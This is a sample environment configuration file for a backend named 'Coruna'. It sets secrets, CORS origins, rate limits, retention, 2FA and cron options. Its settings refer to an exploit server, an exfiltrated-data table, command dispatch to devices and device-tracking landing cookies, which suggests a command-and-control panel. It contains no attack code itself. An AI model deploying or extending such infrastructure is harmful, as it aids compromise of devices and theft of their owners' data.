# ─────────────────────────────────────────────────────────────────────────────
# Coruna backend configuration sample
# Copy to `.env` and modify for your environment. Priority:
#   DB settings table > this .env > code defaults (see admin/config_constants.py)
# ─────────────────────────────────────────────────────────────────────────────

# ① SECRET_KEY (REQUIRED) — generate with:
#   python -c "import secrets; print(secrets.token_urlsafe(64))"
SECRET_KEY=

# ② CORS_ORIGINS — comma-separated list of allowed origins.
#   Use concrete origins in production; never use '*' in production.
# Example: https://admin.your-domain.com,https://ch.your-domain.com,http://127.0.0.1:5173
CORS_ORIGINS=http://localhost:5173,http://127.0.0.1:5173,http://localhost:7000,http://127.0.0.1:7000,http://localhost:7070,http://127.0.0.1:7070

# ③ DARKSWORD_PUBLIC_BASE — public URL of exploit_server (port 7070).
#   Used for redirect generation. Leave empty to auto-use request Host header.
# Example: https://ch.your-domain.com  or  http://YOUR_PUBLIC_IP:7070
DARKSWORD_PUBLIC_BASE=

# ── Auth / Token ──
ACCESS_TOKEN_EXPIRE_MINUTES=120
# Login endpoint rate limit (per IP / minute, brute-force protection)
AUTH_RATE_LIMIT=5/minute

# ── Rate limits ──
RATE_LIMIT=200/minute

# ───────────────────────── Optional overrides (defaults shown) ─────────────────────────
# All values below have sensible defaults in admin/config_constants.py.
# Uncomment to override. Settings DB table > .env > defaults.

# ── retention / data retention ──
#RETENTION_LOG_DAYS=30          # logs table retention days (gz to logs_archive/ then delete)
#RETENTION_AUDIT_DAYS=90        # audit_logs table retention days
#RETENTION_EXFIL_DAYS=365       # exfil_data table retention days (direct delete, no archive)
#RETENTION_FS_LOG_DAYS=30       # logs/ directory .log file retention days
#RETENTION_ARCHIVE_BATCH=5000   # log archive SELECT batch size
#RETENTION_DELETE_CHUNK=500     # IN delete chunk size (SQLite safety limit)
#RETENTION_BACKUP_KEEP_DAYS=14  # backup/ directory retention days

# ── cron / daemon tasks (FastAPI lifespan, OS-independent) ──
#CRON_ROTATE_START=03:30          # Log rotation window start HH:mm
#CRON_ROTATE_WINDOW_MIN=10        # Minutes after start during which rotation may run
#CRON_ROTATE_TICK_SEC=60          # Daemon polling interval (sec)
#CRON_CMD_TIMEOUT_MIN=30          # commands.executing timeout (minutes) -> set to timeout
#CRON_CMD_TICK_SEC=300            # Command-timeout daemon polling interval (sec)

# ── auth / 2FA / session ──
#AUTH_OTP_PENDING_TTL=300      # Pending 2FA token TTL after password step (sec)
#AUTH_SETUP_TOKEN_TTL=600      # Forced 2FA setup_temp_token TTL (sec)
#AUTH_CHANNEL_TS_SKEW=300      # Allowed timestamp skew for channel register (sec)
#AUTH_ACTIVE_DEVICE_MIN=30     # "Online device" recent-activity threshold (minutes)
#AUTH_DASH_MAX_DAYS=90         # Dashboard query max range (days), capped to prevent slow queries

# ── rate limits / endpoint limits (slowapi + @rate_limit dual layer) ──
#LIMIT_AUTH_LOGIN=5           # /api/auth/token per IP per minute
#LIMIT_AUTH_2FA=30            # 2FA verify/bind per user per minute
#LIMIT_AUTH_SEND_OTP=3        # OTP send per IP per minute
#LIMIT_CMD_SEND=180           # Command dispatch per user per minute
#LIMIT_CMD_BULK=10            # Bulk command/operations per user per minute
#LIMIT_TFA_SETUP=10           # 2FA setup endpoint per user per minute
#LIMIT_TFA_VERIFY_TEST=5      # 2FA verify-test per user per minute

# ── device / exploit server parameters ──
#DEVICE_COOKIE_MAX_AGE=2592000  # Landing page ds_chid/ds_tpid/ds_uuid cookie Max-Age (sec), default 30d
#DEVICE_LOG_TAIL_LINES=500      # /logs page default tail line count
#DEVICE_SANITIZE_PATH_MAX=500   # sanitize_path URL/path input truncation chars
#DEVICE_EXFIL_DESC_MAX=500     # exfil_data.description truncation chars before write

# ── pagination defaults ──
#PAGE_DEFAULT_LIMIT=100    # List default limit
#PAGE_MAX_LIMIT=500       # List max allowed limit (capped to prevent OOM)

# ── frontend route defaults (must match backend response) ──
#FE_ROUTE_LOGIN=/login
#FE_ROUTE_DASHBOARD=/dashboard
